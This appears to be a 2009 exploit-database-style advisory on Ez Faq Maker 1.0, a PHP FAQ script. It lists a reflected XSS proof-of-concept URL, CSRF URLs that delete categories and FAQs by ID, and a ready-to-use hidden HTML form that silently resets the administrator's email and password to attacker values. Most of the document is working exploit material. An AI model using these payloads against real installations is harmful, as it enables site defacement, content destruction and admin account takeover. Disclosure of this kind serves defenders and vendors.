@@ -1,0 +1,65 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Ez Faq Maker Multiple Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 15. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Ez Faq Maker
+[#] Version: 1.0
+[#] Platform: PHP
+[#] Link: http://www.scriptsez.net/?action=details&cat=News%20Publishing&id=1898312927
+[#] Price: 24 USD
+[#] Vulnerability: XSS And Multiple XSRF Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--XSS in front end
+ |--Admin Panel
+ |  |--Remove category by id
+ |  |--Remove faq by id
+ |  |--Change admin info
+
+[-]XSS in front end
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/faq/index.php?action=showcat&cid=8&sid="[XSS]
+http://localhost/faq/index.php?action=showcat&cid=8&sid="
+[POC----------------------------------------------------------------------------------------------]
+
+[#]Admin Panel
+
+[-]Remove category by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/faq/admin.php?action=categories&do=delete&op=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Remove faq by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/faq/admin.php?action=delete&id=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[*]Change admin info
+
+When i opened this section of admin panel i noticed that in url there
+was this: &sid=7e52dbb283b4515b82663d6c82f9b67d
+at first i thought that there's cross site request forgery protection,
+but then i realized that script programmer put that there just for
+show, it doesn't do anything. I've first change the value of sid
+parameter and script worked just fine, then i removed entire sid from
+url, and script still worked fine. When i tested the next exploit it
+worked fine, but if you encounter any problems just change form action
+and add the sid i posted couple lines ago.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/faq/admin.php?action=admin_opt" method="post">
+  <input type="hidden" name="email" value="my@newemail.com">
+  <input type="hidden" name="password" value="hacked">
+  <input type="hidden" name="company" value="hacked company">
+  <input type="hidden" name="add" value="true">
+  <input type="submit" name="submit" value=" CHANGE ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]EOF
